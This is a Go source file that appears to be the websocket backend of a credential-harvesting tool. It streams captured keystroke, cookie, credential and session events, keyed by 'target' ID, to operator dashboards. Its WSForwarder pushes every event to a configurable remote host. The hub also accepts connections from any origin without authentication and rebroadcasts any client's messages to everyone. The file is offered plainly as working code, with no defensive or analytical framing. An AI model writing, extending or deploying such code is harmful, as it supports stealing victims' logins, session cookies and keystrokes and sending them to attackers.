package telemetry

import (
	"crypto/tls"
	"encoding/json"
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type EventType string

const (
	EventSession    EventType = "session"
	EventKeystroke  EventType = "keystroke"
	EventCookie     EventType = "cookie"
	EventCredential EventType = "credential"
)

type Event struct {
	Type      EventType         `json:"type"`
	TargetID  string            `json:"target_id,omitempty"`
	SessionID string            `json:"session_id,omitempty"`
	Time      time.Time         `json:"time"`
	Data      map[string]string `json:"data,omitempty"`
}

type Client struct {
	hub    *Hub
	conn   *websocket.Conn
	send   chan []byte
	target string // optional ?target= subscription; "" means receive all events
}

type Hub struct {
	mu       sync.Mutex
	clients  map[*Client]bool
	upgrader websocket.Upgrader
	forward  func(Event)
}

func NewHub() *Hub {
	return &Hub{
		clients: make(map[*Client]bool),
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool { return true },
		},
	}
}

func (h *Hub) SetForwarder(fn func(Event)) {
	h.mu.Lock()
	h.forward = fn
	h.mu.Unlock()
}

func (h *Hub) Register(c *Client) {
	h.mu.Lock()
	h.clients[c] = true
	h.mu.Unlock()
}

func (h *Hub) Unregister(c *Client) {
	h.mu.Lock()
	delete(h.clients, c)
	h.mu.Unlock()
}

// Broadcast marshals an event and delivers it only to subscribed clients. A
// client that connected with ?target=<id> receives events whose TargetID matches
// that id (plus any event with an empty TargetID, treated as global); a client
// with no subscription receives everything. This moves target filtering off the
// client and onto the server so a per-target dashboard only pays for its own
// event stream.
func (h *Hub) Broadcast(e Event) {
	b, err := json.Marshal(e)
	if err != nil {
		return
	}
	h.mu.Lock()
	for c := range h.clients {
		if c.target != "" && c.target != e.TargetID {
			continue
		}
		select {
		case c.send <- b:
		default:
		}
	}
	h.mu.Unlock()
	if h.forward != nil {
		h.forward(e)
	}
}

func (h *Hub) BroadcastBytes(b []byte) {
	h.mu.Lock()
	defer h.mu.Unlock()
	for c := range h.clients {
		select {
		case c.send <- b:
		default:
		}
	}
}

type WSForwarder struct {
	url    string
	tlsCfg *tls.Config
	mu     sync.Mutex
	conn   *websocket.Conn
}

func NewWSForwarder(url string, tlsCfg *tls.Config) *WSForwarder {
	return &WSForwarder{url: url, tlsCfg: tlsCfg}
}

func (w *WSForwarder) ensureLocked() error {
	if w.conn != nil {
		return nil
	}
	dialer := websocket.Dialer{TLSClientConfig: w.tlsCfg}
	conn, _, err := dialer.Dial(w.url, nil)
	if err != nil {
		return err
	}
	w.conn = conn
	return nil
}

func (w *WSForwarder) Send(e Event) {
	w.mu.Lock()
	defer w.mu.Unlock()
	if err := w.ensureLocked(); err != nil {
		log.Printf("[telemetry] forwarder dial error: %v", err)
		return
	}
	if err := w.conn.WriteJSON(e); err != nil {
		log.Printf("[telemetry] forwarder write error: %v", err)
		if w.conn != nil {
			w.conn.Close()
		}
		w.conn = nil
	}
}

func (h *Hub) Handler() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		conn, err := h.upgrader.Upgrade(w, r, nil)
		if err != nil {
			return
		}
		// A ?target=<id> query scopes the subscription to a single target's
		// stream; omit it to receive every event (the "All targets" view).
		c := &Client{hub: h, conn: conn, send: make(chan []byte, 256), target: r.URL.Query().Get("target")}
		h.Register(c)
		go c.writePump()
		go c.readPump()
	})
}

func (c *Client) writePump() {
	for msg := range c.send {
		if err := c.conn.WriteMessage(websocket.TextMessage, msg); err != nil {
			break
		}
	}
	c.conn.Close()
}

func (c *Client) readPump() {
	defer c.hub.Unregister(c)
	defer c.conn.Close()
	for {
		_, msg, err := c.conn.ReadMessage()
		if err != nil {
			return
		}
		c.hub.BroadcastBytes(msg)
	}
}
